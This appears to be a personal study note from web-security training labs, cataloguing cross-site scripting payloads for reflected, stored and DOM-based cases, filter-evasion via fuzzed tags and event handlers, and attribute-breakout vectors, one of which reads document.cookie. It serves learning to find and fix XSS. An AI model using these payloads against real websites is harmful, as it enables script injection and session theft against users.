# basic attack

#apprentice 
#### reflected
in [[cause & sinks#reflected|this]] case: 
> https://insecure-website.com/search?term=`<script>alert(1)</script>`
#### stored
in [[cause & sinks#stored|this]] case:
> comment=`<script>alert(1)</script>`
#### DOM-based
in [[cause & sinks#DOM-based|this]] case
> `"><svg onload=alert(1)>`

# contexts
## between HTML tags
##### most tags and attributes blocked
`<>` -> `<§§>` -> body tag accepted ->`<body%20§§=1>` -> `onresize` accepted -> `<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>`
##### all tags and attributes blocked except custom ones
`<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'`
##### some SVG markup allowed
`<>` -> `<§§>` -> `<svg>`, `<animatetransform>`, `<title>`,`<image>` accepted-> `<svg><animatetransform%20§§=1>` -> `onbegin` accepted-> `"><svg><animatetransform onbegin=alert(1)>`
## in HTML tag attributes

- **close the tag** ->  `"><script>alert(document.domain)</script>`
	- **same tag** -> **new attribute** ->
	   `" autofocus onfocus=alert(document.domain) x="` (`x="` to gracefully repair the following markup)
	  `"onmouseover="alert(1)`
	- **same tag** -> **same attribute** 
	  -  `<a href="javascript:alert(document.domain)">`
	  - `https://vulnerable-website.com/?'accesskey='x'onclick='alert(1)`